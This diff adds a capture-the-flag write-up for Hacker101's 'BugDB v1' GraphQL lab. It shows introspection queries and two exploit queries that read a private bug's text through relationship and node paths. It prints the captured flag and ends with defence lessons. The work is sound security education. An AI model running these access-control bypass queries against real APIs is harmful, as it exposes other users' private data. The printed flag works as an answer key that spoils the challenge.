@@ -1,0 +1,215 @@
+================================
+LAB: BugDB v1
+================================
+
+[LAB INFORMATION]
+-----------------
+Date: January 31, 2026
+Lab URL: https://492b5f451cbad2c1610a2aecf0d9d704.ctf.hacker101.com/
+Category: Web Security - GraphQL
+Level: Easy
+Objective: Extract sensitive data from a GraphQL API to retrieve the flag
+Description: BugDB v1 is a Hacker101 CTF challenge featuring a bug tracking application with a GraphQL API endpoint. The challenge tests understanding of GraphQL introspection and broken access control vulnerabilities.
+
+[RECONNAISSANCE]
+----------------
+
+1. Initial Discovery:
+   - Target URL provided with a GraphQL endpoint
+   - GraphiQL interface available at /graphql
+   - Identified GraphQL API as the main attack surface
+
+2. GraphQL Schema Introspection:
+   - Executed introspection query to map all available types:
+     {
+       __schema {
+         types {
+           name
+           kind
+           description
+         }
+       }
+     }
+
+   - Identified custom types:
+     * Query (entry point)
+     * Users
+     * Bugs
+     * Bugs_ (suspicious duplicate type with underscore)
+
+3. Query Enumeration:
+   - Mapped available queries on the Query type:
+     * node(id: ID!)
+     * user (pagination)
+     * bug (pagination)
+     * findUser(username: String)
+     * findBug(_: String)
+     * allUsers (with pagination)
+     * allBugs (with pagination)
+
+4. Field Discovery:
+   - Users type fields:
+     * id (NON_NULL)
+     * username (String)
+     * bugs (Bugs_Connection - relationship to bugs)
+
+   - Bugs type fields (via allBugs):
+     * id (NON_NULL)
+     * reporterId (Int)
+     * private (Boolean)
+     * reporter (Users object)
+     * NO TEXT FIELD EXPOSED
+
+   - Bugs_ type fields (via findBug/relationships):
+     * id (NON_NULL)
+     * reporterId (Int)
+     * text (String) ← SENSITIVE FIELD EXPOSED
+     * private (Boolean)
+     * reporter (Users object)
+
+[VULNERABILITY DISCOVERY]
+-------------------------
+
+1. Broken Access Control - Inconsistent Type Exposure:
+   - The developers created two separate types: Bugs and Bugs_
+   - Type Bugs (returned by allBugs) intentionally hides the "text" field
+   - Type Bugs_ (returned by relationships and node interface) exposes the "text" field
+   - This inconsistency allows bypassing the intended access control
+
+2. GraphQL Introspection Enabled:
+   - Full schema introspection was enabled in production
+   - Allowed complete mapping of the API structure
+   - Revealed the existence of private bugs via the "private" boolean field
+
+3. IDOR via Multiple Access Paths:
+   - Multiple paths to access the same bug object with different type schemas
+   - Direct query via allBugs → limited fields
+   - Access via user relationships → full fields including text
+   - Access via node interface → full fields including text
+
+4. Enumeration of Private Resources:
+   - Listed all bugs using allBugs query
+   - Identified bug with id "QnVnczoy" marked as private: true
+   - Bug belongs to user with reporterId: 2 (username: "victim")
+
+[EXPLOITATION]
+--------------
+
+Method 1 - Via User Relationships (Most Efficient):
+
+Query executed:
+{
+  allUsers {
+    edges {
+      node {
+        id
+        username
+        bugs {
+          edges {
+            node {
+              id
+              text
+              private
+              reporterId
+            }
+          }
+        }
+      }
+    }
+  }
+}
+
+Result: Single query extracted all users and their associated bugs, including the private bug with the flag.
+
+Method 2 - Via Node Interface:
+
+Step 1: Enumerate bug IDs
+{
+  allBugs {
+    edges {
+      node {
+        id
+        private
+        reporterId
+      }
+    }
+  }
+}
+
+Result: Found two bugs
+- QnVnczox (private: false, reporterId: 1)
+- QnVnczoy (private: true, reporterId: 2)
+
+Step 2: Access private bug via node interface
+{
+  node(id: "QnVnczoy") {
+    id
+    ... on Bugs_ {
+      text
+      private
+      reporterId
+    }
+  }
+}
+
+Result: Successfully retrieved the text field of the private bug containing the flag.
+
+[EVIDENCE]
+----------
+
+Flag Retrieved:
+60e282d72ba9d8ec3b4058582d3d2e7b6611b855c6bb009a1f32776457056294
+
+Complete Response:
+{
+  "data": {
+    "node": {
+      "id": "QnVnc186Mg==",
+      "text": "^FLAG^60e282d72ba9d8ec3b4058582d3d2e7b6611b855c6bb009a1f32776457056294$FLAG$",
+      "private": true,
+      "reporterId": 2
+    }
+  }
+}
+
+User Information:
+- admin (ID: VXNlcnM6MQ==): owns public bug "This is an example bug"
+- victim (ID: VXNlcnM6Mg==): owns private bug containing the flag
+
+[LESSONS LEARNED]
+-----------------
+
+1. GraphQL Security Fundamentals:
+   - Disable introspection in production environments
+   - Introspection reveals the entire API structure to potential attackers
+   - If introspection is required, implement authentication/authorization checks
+
+2. Consistent Access Control Across Types:
+   - Ensure all types representing the same entity have consistent field visibility
+   - The Bugs vs Bugs_ inconsistency created an access control bypass
+   - Don't rely on hiding fields in one type if they're exposed in another
+
+3. Relationship-Based Access Paths:
+   - Developers often secure direct queries but forget relationship traversals
+   - In this challenge, allBugs was "secured" but accessing bugs via users.bugs was not
+   - Always test multiple query paths to the same data
+
+4. Field-Level Authorization:
+   - Implement authorization checks at the field resolver level, not just at query level
+   - The "text" field should have had authorization logic: "only show if user owns bug OR bug is public"
+   - Type-based hiding is not a security control
+
+5. GraphQL Pentesting Methodology:
+   - Always start with introspection to map the complete attack surface
+   - Enumerate all types, queries, mutations, and their relationships
+   - Compare different types that represent similar entities for inconsistencies
+   - Test multiple access paths: direct queries, relationships, interfaces
+   - Look for boolean flags like "private", "hidden", "internal" that indicate sensitive data
+
+6. Defense Recommendations:
+   - Implement field-level authorization resolvers
+   - Disable introspection or require authentication for it
+   - Use consistent type schemas across the API
+   - Implement query depth and complexity limiting
+   - Log and monitor unusual GraphQL query patterns
+   - Apply the principle of least privilege to all data access
